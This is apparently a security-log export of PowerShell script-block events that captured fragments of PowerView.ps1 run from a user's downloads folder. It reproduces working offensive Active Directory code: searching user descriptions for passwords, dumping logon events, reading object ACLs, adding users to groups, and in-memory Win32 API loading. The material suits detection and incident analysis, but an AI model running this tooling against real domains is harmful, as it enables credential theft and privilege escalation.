.PARAMETER SearchField        User field to search, default of ""description"".    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER Domain        Domain to search computer fields for, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Find-UserField -SearchField info -SearchTerm backup        Find user accounts with ""backup"" in the ""info"" field.#>    [CmdletBinding()]    param(        [Parameter(Position=0,ValueFromPipeline=$True)]        [String]        $SearchTerm = 'pass',        [String]        $SearchField = 'description',        [String]        $ADSpath,        [String]        $Domain,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    process {        Get-NetUser -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Filter ""($SearchField=*$SearchTerm*)"" -PageSize $PageSize | Select-Object samaccountname,$SearchField    }}function Get-UserEvent {<#    .SYNOPSIS        Dump and parse security events relating to an account logon (ID 4624)        or a TGT request event (ID 4768). Intended to be used and tested on        Windows 2008 Domain Controllers.        Admin Reqd? YES        Author: @sixdub    .PARAMETER ComputerName        The computer to get events from. Default: Localhost    .PARAMETER EventType        Either 'logon', 'tgt', or 'all'. Defaults: 'logon'    .PARAMETER DateStart        Filter out all events before this date. Default: 5 days       .EXAMPLE        PS C:\> Get-UserEvent -ComputerName DomainController.testlab.local    .LINK        http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/#>    Param(        [String]        $ComputerName = $Env:ComputerName,        [String]        [ValidateSet(""logon"",""tgt"",""all"")]        $EventType = ""logon"",        [DateTime]        $DateStart=[DateTime]::Today.AddDays(-5)    )    if($EventType.ToLower() -like ""logon"") {        [Int32[]]$ID = @(4624)    }    elseif($EventType.ToLower() -like ""tgt"") {        [Int32[]]$ID = @(4768)    }    else {        [Int32[]]$ID = @(4624, 4768)    }    #grab all events matching our filter for the specified host    Get-WinEvent -ComputerName $ComputerName -FilterHashTable @{ LogName = 'Security'; ID=$ID; StartTime=$DateStart} -ErrorAction SilentlyContinue | ForEach-Object {        if($ID -contains 4624) {                # first parse and check the logon event type. This could be later adapted and tested for RDP logons (type 10)            if($_.message -match '(?s)(?<=Logon Type:).*?(?=(Impersonation Level:|New Logon:))') {                if($Matches) {                    $LogonType = $Matches[0].trim()                    $Matches = $Null                }            }            else {                $LogonType = """"            }            # interactive logons or domain logons            if (($LogonType -eq 2) -or ($LogonType -eq 3)) {                try {                    # parse and store the account used and the address they came from                    if($_.message -match '(?s)(?<=New Logon:).*?(?=Process Information:)') {                        if($Matches) {                            $UserName = $Matches[0].split(""`n"")[2].split("":"")[1].trim()                            $Domain = $Matches[0].split(""`n"")[3].split("":"")[1].trim()                            $Matches = $Null                        }                    }                    if($_.message -match '(?s)(?<=Network Information:).*?(?=Source Port:)') {                        if($Matches) {                            $Address = $Matches[0].split(""`n"")[2].split("":"")[1].trim()                            $Matches = $Null                        }                    }                    # only add if there was account information not for a machine or anonymous logon                    if ($UserName -and (-not $UserName.endsWith('$')) -and ($UserName -ne 'ANONYMOUS LOGON')) {                        $LogonEventProperties = @{                            'Domain' = $Domain                            'ComputerName' = $ComputerName                            'Username' = $UserName                            'Address' = $Address                            'ID' = '4624'                            'LogonType' = $LogonType                            'Time' = $_.TimeCreated                        }                        New-Object -TypeName PSObject -Property $LogonEventProperties                    }                }                catch {                    Write-Debug ""Error parsing event logs: $_""                }            }        }        if($ID -contains 4768) {            # the TGT event type            try {                if($_.message -match '(?s)(?<=Account Information:).*?(?=Service Information:)') {                    if($Matches) {                        $Username = $Matches[0].split(""`n"")[1].split("":"")[1].trim()                        $Domain = $Matches[0].split(""`n"")[2].split("":"")[1].trim()                        $Matches = $Null                    }                }                if($_.message -match '(?s)(?<=Network Information:).*?(?=Additional Information:)') {                    if($Matches) {                        $Address = $Matches[0].split(""`n"")[1].split("":"")[-1].trim()                        $Matches = $Null                    }                }                $LogonEventProperties = @{                    'Domain' = $Domain                    'ComputerName' = $ComputerName                    'Username' = $UserName                    'Address' = $Address                    'ID' = '4768'                    'LogonType' = ''                    'Time' = $_.TimeCreated                }                New-Object -TypeName PSObject -Property $LogonEventProperties            }            catch {                Write-Debug ""Error parsing event logs: $_""            }        }    }}function Get-ObjectAcl {<#    .SYNOPSIS        Returns the ACLs associated with a specific active directory object.        Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.    .PARAMETER SamAccountName        Object name to filter for.            .PARAMETER Name        Object name to filter for.    .PARAMETER DistinguishedName        Object distinguished name to filter for.    .PARAMETER ResolveGUIDs        Switch. Resolve GUIDs to their display names.    .PARAMETER Filter        A customized ldap filter string to use, e.g. ""(description=*admin*)""         .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER ADSprefix        Prefix to set for the searcher (like ""CN=Sites,CN=Configuration"")    .PARAMETER RightsFilter        Only return results with the associated rights, ""All"", ""ResetPassword"",""WriteMembers""    .PARAMETER Domain        The domain to use for the query, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-ObjectAcl -SamAccountName matt.admin -domain testlab.local                Get the ACLs for the matt.admin user in the testlab.local domain    .EXAMPLE        PS C:\> Get-ObjectAcl -SamAccountName matt.admin -domain testlab.local -ResolveGUIDs                Get the ACLs for the matt.admin user in the testlab.local domain and        resolve relevant GUIDs to their display names.#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $SamAccountName,        [String]        $Name = ""*"",        [Alias('DN')]        [String]        $DistinguishedName = ""*"",        [Switch]        $ResolveGUIDs,        [String]        $Filter,        [String]        $ADSpath,        [String]        $ADSprefix,        [String]        [ValidateSet(""All"",""ResetPassword"",""WriteMembers"")]        $RightsFilter,        [String]        $Domain,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix $ADSprefix -PageSize $PageSize        # get a GUID -> name mapping        if($ResolveGUIDs) {            $GUIDs = Get-GUIDMap -Domain $Domain -DomainController $DomainController -PageSize $PageSize        }    }    process {        if ($Searcher) {            if($SamAccountName) {                $Searcher.filter=""(&(samaccountname=$SamAccountName)(name=$Name)(distinguishedname=$DistinguishedName)$Filter)""              }            else {                $Searcher.filter=""(&(name=$Name)(distinguishedname=$DistinguishedName)$Filter)""              }              try {                $Searcher.FindAll() | Where-Object {$_} | Foreach-Object {                    $Object = [adsi]($_.path)                    if($Object.distinguishedname) {                        $Access = $Object.PsBase.ObjectSecurity.access                        $Access | ForEach-Object {                            $_ | Add-Member NoteProperty 'ObjectDN' ($Object.distinguishedname[0])                            if($Object.objectsid[0]){                                $S = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value                            }                            else {                                $S = $Null                            }                                                        $_ | Add-Member NoteProperty 'ObjectSID' $S                            $_                        }                    }                } | ForEach-Object {                    if($RightsFilter) {                        $GuidFilter = Switch ($RightsFilter) {                            ""ResetPassword"" { ""00299570-246d-11d0-a768-00aa006e0529"" }                            ""WriteMembers"" { ""bf9679c0-0de6-11d0-a285-00aa003049e2"" }                            Default { ""00000000-0000-0000-0000-000000000000""}                        }                        if($_.ObjectType -eq $GuidFilter) { $_ }                    }                    else {                        $_                    }                } | Foreach-Object {                    if($GUIDs) {                        # if we're resolving GScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","    }            else {                # otherwise, get the local machine context                Write-Verbose ""Adding user $UserName to $GroupName on localhost""                $Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Env:ComputerName)            }            # find the particular group            $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($Context,$GroupName)            # add the particular user to the group            $Group.Members.add($Context, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)            # commit the changes            $Group.Save()        }        catch {            Write-Warning ""Error adding $UserName to $GroupName : $_""        }    }}function Get-UserProperty {<#    .SYNOPSIS        Returns a list of all user object properties. If a property        name is specified, it returns all [user:property] values.        Taken directly from @obscuresec's post:            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html    .PARAMETER Properties        Property names to extract for users.    .PARAMETER Domain        The domain to query for user properties, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-UserProperty -Domain testing                Returns all user properties for users in the 'testing' domain.    .EXAMPLE        PS C:\> Get-UserProperty -Properties ssn,lastlogon,location                Returns all an array of user/ssn/lastlogin/location combinations        for users in the current domain.    .LINK        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html#>    [CmdletBinding()]    param(        [String[]]        $Properties,        [String]        $Domain,                [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    if($Properties) {        # extract out the set of all properties for each object        $Properties = ,""name"" + $Properties        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -Property $Properties    }    else {        # extract out just the property names        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -First 1 | Get-Member -MemberType *Property | Select-Object -Property 'Name'    }}function Find-UserField {<#    .SYNOPSIS        Searches user object fields for a given word (default *pass*). Default        field being searched is 'description'.        Taken directly from @obscuresec's post:            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html    .PARAMETER SearchTerm        Term to search for, default of ""pass"".    .PARAMETER SearchField        User field to search, default of ""description"".    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER Domain        Domain to search computer fields for, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Find-UserField -SearchField info -SearchTerm backup        Find user accounts with ""backup"" in the ""info"" field.#>    [CmdletBinding()]    param(        [Parameter(Position=0,ValueFromPipeline=$True)]        [String]        $SearchTerm = 'pass',        [String]        $SearchField = 'description',        [String]        $ADSpath,        [String]        $Domain,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    process {        Get-NetUser -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Filter ""($SearchField=*$SearchTerm*)"" -PageSize $PageSize | Select-Object samaccountname,$SearchField    }}function Get-UserEvent {<#    .SYNOPSIS        Dump and parse security events relating to an account logon (ID 4624)        or a TGT request event (ID 4768). Intended to be used and tested on        Windows 2008 Domain Controllers.        Admin Reqd? YES        Author: @sixdub    .PARAMETER ComputerName        The computer to get events from. Default: Localhost    .PARAMETER EventType        Either 'logon', 'tgt', or 'all'. Defaults: 'logon'    .PARAMETER DateStart        Filter out all events before this date. Default: 5 days       .EXAMPLE        PS C:\> Get-UserEvent -ComputerName DomainController.testlab.local    .LINK        http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/#>    Param(        [String]        $ComputerName = $Env:ComputerName,        [String]        [ValidateSet(""logon"",""tgt"",""all"")]        $EventType = ""logon"",        [DateTime]        $DateStart=[DateTime]::Today.AddDays(-5)    )    if($EventType.ToLower() -like ""logon"") {        [Int32[]]$ID = @(4624)    }    elseif($EventType.ToLower() -like ""tgt"") {        [Int32[]]$ID = @(4768)    }    else {        [Int32[]]$ID = @(4624, 4768)    }    #grab all events matching our filter for the specified host    Get-WinEvent -ComputerName $ComputerName -FilterHashTable @{ LogName = 'Security'; ID=$ID; StartTime=$DateStart} -ErrorAction SilentlyContinue | ForEach-Object {        if($ID -contains 4624) {                # first parse and check the logon event type. This could be later adapted and tested for RDP logons (type 10)            if($_.message -match '(?s)(?<=Logon Type:).*?(?=(Impersonation Level:|New Logon:))') {                if($Matches) {                    $LogonType = $Matches[0].trim()                    $Matches = $Null                }            }            else {                $LogonType = """"            }            # interactive logons or domain logons            if (($LogonType -eq 2) -or ($LogonType -eq 3)) {                try {                    # parse and store the account used and the address they came from                    if($_.message -match '(?s)(?<=New Logon:).*?(?=Process Information:)') {                        if($Matches) {                            $UserName = $Matches[0].split(""`n"")[2].split("":"")[1].trim()                            $Domain = $Matches[0].split(""`n"")[3].split("":"")[1].trim()                            $Matches = $Null                        }                    }                    if($_.message -match '(?s)(?<=Network Information:).*?(?=Source Port:)') {                        if($Matches) {                            $Address = $Matches[0].split(""`n"")[2].split("":"")[1].trim()                            $Matches = $Null                        }                    }                    # only add if there was account information not for a machine or anonymous logon                    if ($UserName -and (-not $UserName.endsWith('$')) -and ($UserName -ne 'ANONYMOUS LOGON')) {                        $LogonEventProperties = @{                            'Domain' = $Domain                            'ComputerName' = $ComputerName                            'Username' = $UserName                            'Address' = $Address                            'ID' = '4624'                            'LogonType' = $LogonType                            'Time' = $_.TimeCreated                        }                        New-Object -TypeName PSObject -Property $LogonEventProperties                    }                }                catch {                    Write-Debug ""Error parsing event logs: $_""                }            }        }        if($ID -contains 4768) {            # the TGT event type            try {                if($_.message -match '(?s)(?<=Account Information:).*?(?=Service Information:)') {                    if($Matches) {                        $Username = $Matches[0].split(""`n"")[1].split("":"")[1].trim()                        $Domain = $Matches[0].split(""`n"")[2].split("":"")[1].trim()                        $Matches = $Null                    }                }                if($_.message -match '(?s)(?<=Network Information:).*?(?=Additional Information:)') {                    if($Matches) {                        $Address = $Matches[0].split(""`n"")[1].split("":"")[-1].trim()                        $Matches = $Null                    }                }                $LogonEventProperties = @{                    'Domain' = $Domain                    'ComputerName' = $ComputerName                    'Username' = $UserName                    'Address' = $Address                    'ID' = '4768'                    'LogonType' = ''                    'Time' = $_.TimeCreated                }                New-Object -TypeName PSObject -Property $LogonEventProperties            }            catch {                Write-Debug ""Error parsing event logs: $_""            }        }    }}function Get-ObjectAcl {<#    .SYNOPSIS        Returns the ACLs associated with a specific active directory object.        Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.    .PARAMETER SamAccountName        Object name to filter for.            .PARAMETER Name        Object name to filter for.    .PARAMETER DistinguishedName        Object distinguished name to filter for.    .PARAMETER ResolveGUIDs        Switch. Resolve GUIDs to their display names.    .PARAMETER Filter        A customized ldap filter string to use, e.g. ""(description=*admin*)""         .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER ADSprefix        Prefix to set for the searcher (like ""CN=Sites,CN=Configuration"")    .PARAMETER RightsFilter        Only return results with the associated rights, ""All"", ""ResetPassword"",""WriteMembers""    .PARAMETER Domain        The domain to use for the query, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-ObjectAcl -SamAccountName matt.admin -domain testlab.local                Get the ACLs for the matt.admin user in the testlab.local domain    .EXAMPLE        PS C:\> Get-ObjectAcl -SamAccountName matt.admin -domain testlab.local -ResolveGUIDs                Get the ACLs for the matt.admin user in the testlab.local domain and        resolve relevant GUIDs to their display names.#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $SamAccountName,        [String]        $Name = ""*"",        [Alias('DN')]        [String]        $DistinguishedName = ""*"",        [Switch]        $ResolveGUIDs,        [String]        $Filter,        [String]        $ADSpath,        [String]        $ADSprefix,        [String]        [ValidateSet(""All"",""ResetPassword"",""WriteMembers"")]        $RightsFilter,        [String]        $Domain,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix $ADSprefix -PageSize $PageSize        # get a GUID -> name mapping        if($ResolveGUIDs) {            $GUIDs = Get-GUIDMap -Domain $Domain -DomainController $DomainController -PageSize $PageSize        }    }    process {        if ($Searcher) {            if($SamAccountName) {                $Searcher.filter=""(&(samaccountname=$SamAccountName)(name=$Name)(distinguishedname=$DistinguishedName)$Filter)""              }            else {                $Searcher.filter=""(&(name=$Name)(distinguishedname=$DistinguishedName)$Filter)""              }              try {                $Searcher.FindAll() | Where-Object {$_} | Foreach-Object {                    $Object = [adsi]($_.path)                    if($Object.distinguishedname) {                        $Access = $Object.PsBase.ObjectSecurity.access                        $Access | ForEach-Object {                            $_ | Add-Member NoteProperty 'ObjectDN' ($Object.distinguishedname[0])                            if($Object.objectsid[0]){                                $S = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value                            }                            else {                                $S = $Null                            }                                                        $_ | Add-Member NoteProperty 'ObjectSID' $S                            $_                        }                    }                } | ForEach-Object {                    if($RightsFilter) {                        $GuidFilter = Switch ($RightsFilter) {                            ""ResetPassword"" { ""00299570-246d-11d0-a768-00aa006e0529"" }                            ""WriteMembers"" { ""bf9679c0-0de6-11d0-a285-00aa003049e2"" }                            Default { ""00000000-0000-0000-0000-000000000000""}                        }                        if($_.ObjectType -eq $GuidFilter) { $_ }                    }                    else {                        $_                    }                } | Foreach-Object {                    if($GUIDs) {                        # if we're resolving G","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"AHV3ypsB8mE-0EyZh38H","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (1 of 26):#requires -version 2<#    PowerSploit File: PowerView.ps1    Author: Will Schroeder (@harmj0y)    License: BSD 3-Clause    Required Dependencies: None    Optional Dependencies: None#>########################################################## PSReflect code for Windows API access# Author: @mattifestation#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1#########################################################function New-InMemoryModule{<#    .SYNOPSIS        Creates an in-memory assembly and module        Author: Matthew Graeber (@mattifestation)        License: BSD 3-Clause        Required Dependencies: None        Optional Dependencies: None    .DESCRIPTION        When defining custom enums, structs, and unmanaged functions, it is        necessary to associate to an assembly module. This helper function        creates an in-memory module that can be passed to the 'enum',        'struct', and Add-Win32Type functions.    .PARAMETER ModuleName        Specifies the desired name for the in-memory assembly and module. If        ModuleName is not provided, it will default to a GUID.    .EXAMPLE        $Module = New-InMemoryModule -ModuleName Win32#>    Param    (        [Parameter(Position = 0)]        [ValidateNotNullOrEmpty()]        [String]        $ModuleName = [Guid]::NewGuid().ToString()    )    $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()    ForEach ($Assembly in $LoadedAssemblies) {        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {            return $Assembly        }    }    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)    $Domain = [AppDomain]::CurrentDomain    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)    return $ModuleBuilder}# A helper function used to reduce typing while defining function# prototypes for Add-Win32Type.function func{    Param    (        [Parameter(Position = 0, Mandatory = $True)]        [String]        $DllName,        [Parameter(Position = 1, Mandatory = $True)]        [String]        $FunctionName,        [Parameter(Position = 2, Mandatory = $True)]        [Type]        $ReturnType,        [Parameter(Position = 3)]        [Type[]]        $ParameterTypes,        [Parameter(Position = 4)]        [Runtime.InteropServices.CallingConvention]        $NativeCallingConvention,        [Parameter(Position = 5)]        [Runtime.InteropServices.CharSet]        $Charset,        [Switch]        $SetLastError    )    $Properties = @{        DllName = $DllName        FunctionName = $FunctionName        ReturnType = $ReturnType    }    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }    if ($Charset) { $Properties['Charset'] = $Charset }    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }    New-Object PSObject -Property $Properties}function Add-Win32Type{<#    .SYNOPSIS        Creates a .NET type for an unmanaged Win32 function.        Author: Matthew Graeber (@mattifestation)        License: BSD 3-Clause        Required Dependencies: None        Optional Dependencies: func    .DESCRIPTION        Add-Win32Type enables you to easily interact with unmanaged (i.e.        Win32 unmanaged) functions in PowerShell. After providing        Add-Win32Type with a function signature, a .NET type is created        using reflection (i.e. csc.exe is never called like with Add-Type).        The 'func' helper function can be used to reduce typing when defining        multiple function definitions.    .PARAMETER DllName        The name of the DLL.    .PARAMETER FunctionName        The name of the target function.    .PARAMETER ReturnType        The return type of the function.    .PARAMETER ParameterTypes        The function parameters.    .PARAMETER NativeCallingConvention        Specifies the native calling convention of the function. Defaults to        stdcall.    .PARAMETER Charset        If you need to explicitly call an 'A' or 'W' Win32 function, you can        specify the character set.    .PARAMETER SetLastError        Indicates whether the callee calls the SetLastError Win32 API        function before returning from the attributed method.    .PARAMETER Module        The in-memory module that will host the functions. Use        New-InMemoryModule to define an in-memory module.    .PARAMETER Namespace        An optional namespace to prepend to the type. Add-Win32Type defaults        to a namespace consisting only of the name of the DLL.    .EXAMPLE        $Mod = New-InMemoryModule -ModuleName Win32        $FunctionDefinitions = @(          (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),          (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),          (func ntdll RtlGetCurrentPeb ([IntPtr]) @())        )        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'        $Kernel32 = $Types['kernel32']        $Ntdll = $Types['ntdll']        $Ntdll::RtlGetCurrentPeb()        $ntdllbase = $Kernel32::GetModuleHandle('ntdll')        $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')    .NOTES        Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189        When defining multiple function prototypes, it is ideal to provide        Add-Win32Type with an array of function signatures. That way, they        are all incorporated into the same in-memory module.#>    [OutputType([Hashtable])]    Param(        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]        [String]        $DllName,        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]        [String]        $FunctionName,        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]        [Type]        $ReturnType,        [Parameter(ValueFromPipelineByPropertyName = $True)]        [Type[]]        $ParameterTypes,        [Parameter(ValueFromPipelineByPropertyName = $True)]        [Runtime.InteropServices.CallingConvention]        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,        [Parameter(ValueFromPipelineByPropertyName = $True)]        [Runtime.InteropServices.CharSet]        $Charset = [Runtime.InteropServices.CharSet]::Auto,        [Parameter(ValueFromPipelineByPropertyName = $True)]        [Switch]        $SetLastError,        [Parameter(Mandatory = $True)]        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]        $Module,        [ValidateNotNull()]        [String]        $Namespace = ''    )    BEGIN    {        $TypeHash = @{}    }    PROCESS    {        if ($Module -is [Reflection.Assembly])        {            if ($Namespace)            {                $TypeHash[$DllName] = $Module.GetType(""$Namespace.$DllName"")            }            else            {                $TypeHash[$DllName] = $Module.GetType($DllName)            }        }        else        {            # Define one type for each DLL            if (!$TypeHash.ContainsKey($DllName))            {                if ($Namespace)                {                    $TypeHash[$DllName] = $Module.DefineType(""$Namespace.$DllName"", 'Public,BeforeFieldInit')                }                else                {                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')                }            }            $Method = $TypeHash[$DllName].DefineMethod(                $FunctionName,                'Public,Static,PinvokeImpl',                $ReturnType,                $ParameterTypes)            # Make each ByRef parameter an Out parameter            $i = 1            ForEach($Parameter in $ParameterTypes)            {                if ($Parameter.IsByRef)                {                    [void] $Method.DefineParameter($i, 'Out', $Null)                }                $i++            }            $DllImport = [Runtime.InteropServices.DllImportAttribute]            $SetLastErrorField = $DllImport.GetField('SetLastError')            $CallingConventionField = $DllImport.GetField('CallingConvention')            $CharsetField = $DllImport.GetField('CharSet')            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }            # Equivalent to C# version of [DllImport(DllName)]            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))            $Method.SetCustomAttribute($DllImportAttribute)        }    }    END    {        if ($Module -is [Reflection.Assembly])        {            return $TypeHash        }        $ReturnTypes = @{}        ForEach ($Key in $TypeHash.Keys)        {            $Type = $TypeHash[$Key].CreateType()            $ReturnTypes[$Key] = $Type        }        return $ReturnTypes    }}function psenum{<#    .SYNOPSIS        Creates an in-memory enumeration for use in your PowerShell session.        Author: Matthew Graeber (@mattifestation)        License: BSD 3-Clause        Required Dependencies: None        Optional Dependencies: None         .DESCRIPTION        The 'psenum' function facilitates the creation of enums entirely in        memory using as close to a ""C style"" as PowerShell will allow.    .PARAMETER Module        The in-memory module that will host the enum. Use        New-InMemoryModule to define an in-memory module.    .PARAMETER FullName        The fully-qualified name of the enum.    .PARAMETER Type        The type of each enum element.    .PARAMETER EnumElements        A hashtable of enum elements.    .PARAMETER Bitfield        Specifies that the enum should be treated as a bitfield.    .EXAMPLE        $Mod = New-InMemoryModule -ModuleName Win32        $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{            UNKNOWN =                  0            NATIVE =                   1 # Image doesn't require a subsystem.            WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.            WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.            OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.            POSIX_CUI =                7 # Image runs in the Posix character subsystem.            NATIVE_WINDOWS =           8 # Image is a native Win9x driver.            WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.            EFI_APPLICATION =          10            EFI_BOOT_SERVICE_DRIVER =  11            EFI_RUNTIME_DRIVER =       12            EFI_ROM =                  13            XBOX =                     14            WINDOWS_BOOT_APPLICATION = 16        }    .NOTES        PowerShell purists may disagree with the naming of this function but        again, this was developed in such a way so as to emulate a ""C style""        definition as closely as possible. Sorry, I'm not going to name it        New-Enum. :P#>    [OutputType([Type])]    Param    (        [Parameter(Position = 0, Mandatory = $True)]        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]        $Module,        [Parameter(Position = 1, Mandatory = $True)]        [ValidateNotNullOrEmpty()]        [String]        $FullName,        [Parameter(Position = 2, Mandatory = $True)]        [Type]        $Type,        [Parameter(Position = 3, Mandatory = $True)]        [ValidateNotNullOrEmpty()]        [Hashtable]        $EnumElements,        [Switch]        $Bitfield    )    if ($Module -is [Reflection.Assembly])    {        return ($Module.GetType($FullName))    }    $EnumType = $Type -as [Type]    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)    if ($Bitfield)    {        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)    }    ForEach ($Key in $EnumElements.Keys)    {        # Apply the specified enum type to each element        $Null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)    }    $EnumBuilder.CreateType()}# A helper function used to reduce typing while defining struct# fields.function field{    Param    (        [Parameter(Position = 0, Mandatory = $True)]        [UInt16]        $Position,        [Parameter(Position = 1, Mandatory = $True)]        [Type]        $Type,        [Parameter(Position = 2)]        [UInt16]        $Offset,        [Object[]]        $MarshalAs    )    @{        Position = $Position        Type = $Type -as [Type]        Offset = $Offset        MarshalAs = $MarshalAs    }}function struct{<#    .SYNOPSIS        Creates an in-memory struct for use in your PowerShell session.        Author: Matthew Graeber (@mattifestation)        License: BSD 3-Clause        Required Dependencies: None        Optional Dependencies: field    .DESCRIPTION        The 'struct'ScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","#requires -version 2<#    PowerSploit File: PowerView.ps1    Author: Will Schroeder (@harmj0y)    License: BSD 3-Clause    Required Dependencies: None    Optional Dependencies: None#>########################################################## PSReflect code for Windows API access# Author: @mattifestation#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1#########################################################function New-InMemoryModule{<#    .SYNOPSIS        Creates an in-memory assembly and module        Author: Matthew Graeber (@mattifestation)        License: BSD 3-Clause        Required Dependencies: None        Optional Dependencies: None    .DESCRIPTION        When defining custom enums, structs, and unmanaged functions, it is        necessary to associate to an assembly module. This helper function        creates an in-memory module that can be passed to the 'enum',        'struct', and Add-Win32Type functions.    .PARAMETER ModuleName        Specifies the desired name for the in-memory assembly and module. If        ModuleName is not provided, it will default to a GUID.    .EXAMPLE        $Module = New-InMemoryModule -ModuleName Win32#>    Param    (        [Parameter(Position = 0)]        [ValidateNotNullOrEmpty()]        [String]        $ModuleName = [Guid]::NewGuid().ToString()    )    $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()    ForEach ($Assembly in $LoadedAssemblies) {        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {            return $Assembly        }    }    $DynAssembly = New-Object 